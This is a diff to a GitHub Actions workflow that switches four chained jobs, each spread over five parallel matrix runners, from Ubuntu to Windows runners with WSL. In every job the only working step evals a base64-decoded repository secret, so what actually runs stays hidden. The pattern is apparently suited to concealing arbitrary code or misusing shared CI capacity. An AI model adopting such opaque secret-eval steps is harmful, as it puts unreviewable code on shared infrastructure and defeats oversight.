@@ -5,18 +5,23 @@ on:
 
 jobs:
   task-job:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     continue-on-error: true
     strategy:
       fail-fast: false
       matrix:
          vm-number: [1,2,3,4,5]
     steps:
-      - run: |
-          eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
+    - uses: Vampire/setup-wsl@v6
+      with:
+          distribution: Ubuntu-24.04
+          wsl-shell-command: bash -c "cd && bash --noprofile --norc -euo pipefail '{0}'"
+    - shell: wsl-bash {0}
+      run: |
+        eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
 
   task-job-2:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     continue-on-error: true
     needs: task-job
     strategy:
@@ -24,11 +29,16 @@ jobs:
       matrix:
          vm-number: [1,2,3,4,5]
     steps:
-      - run: |
-          eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
+    - uses: Vampire/setup-wsl@v6
+      with:
+          distribution: Ubuntu-24.04
+          wsl-shell-command: bash -c "cd && bash --noprofile --norc -euo pipefail '{0}'"
+    - shell: wsl-bash {0}
+      run: |
+        eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
 
   task-job-3:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     continue-on-error: true
     needs: task-job-2
     strategy:
@@ -36,11 +46,16 @@ jobs:
       matrix:
          vm-number: [1,2,3,4,5]
     steps:
-      - run: |
-          eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
+    - uses: Vampire/setup-wsl@v6
+      with:
+          distribution: Ubuntu-24.04
+          wsl-shell-command: bash -c "cd && bash --noprofile --norc -euo pipefail '{0}'"
+    - shell: wsl-bash {0}
+      run: |
+        eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
 
   task-job-4:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     continue-on-error: true
     needs: task-job-3
     strategy:
@@ -48,5 +63,10 @@ jobs:
       matrix:
          vm-number: [1,2,3,4,5]
     steps:
-      - run: |
-          eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
+    - uses: Vampire/setup-wsl@v6
+      with:
+          distribution: Ubuntu-24.04
+          wsl-shell-command: bash -c "cd && bash --noprofile --norc -euo pipefail '{0}'"
+    - shell: wsl-bash {0}
+      run: |
+        eval "$(echo '${{ secrets.CODEKEY }}' | base64 -d)"
